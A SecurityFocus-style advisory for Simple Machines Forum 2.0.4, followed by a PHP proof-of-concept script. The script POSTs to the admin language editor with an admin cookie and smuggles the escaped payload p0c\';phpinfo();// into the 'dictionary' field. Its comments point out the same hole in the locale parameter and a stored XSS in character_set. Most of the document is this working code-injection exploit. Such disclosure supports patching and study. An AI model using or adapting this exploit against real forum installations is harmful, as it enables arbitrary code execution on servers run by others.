source: http://www.securityfocus.com/bid/59409/info

SMF is prone to an HTML-injection and multiple PHP code-injection vulnerabilities.

An attacker may leverage these issues to execute arbitrary server-side script code on an affected computer with the privileges of the affected application and inject hostile HTML and script code into vulnerable sections of the application.

SMF 2.0.4 is vulnerable; other versions may also be affected. 

<?php

// proof of concept that latest SMF (2.0.4) can be exploited by php injection.

// payload code must escape from \', so you should try with something like
// that:
// p0c\';phpinfo();// as a 'dictionary' value. Same story for locale
// parameter.
// For character_set - another story, as far as I remember, because here we
// have
// a nice stored xss. ;)

// 21/04/2013 
// http://HauntIT.blogspot.com

// to successfully exploit smf 2.0.4 we need correct admin's cookie:
$cookie = 'SMFCookie956=allCookiesHere';
$ch =
curl_init('http://smf_2.0.4/index.php?action=admin;area=languages;sa=editlang;lid=english');

curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_COOKIE, $cookie);
curl_setopt($ch, CURLOPT_POST, 1); // send as POST (to 'On')
curl_setopt($ch, CURLOPT_POSTFIELDS,
"character_set=en&locale=helloworld&dictionary=p0c\\';phpinfo();//&spelling=american&ce0361602df1=c6772abdb6d5e3f403bd65e3c3c2a2c0&save_main=Save");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

$page = curl_exec($ch);

echo 'PHP code:<br>'.$page;

curl_close($ch); // to close 'logged-in' part

?>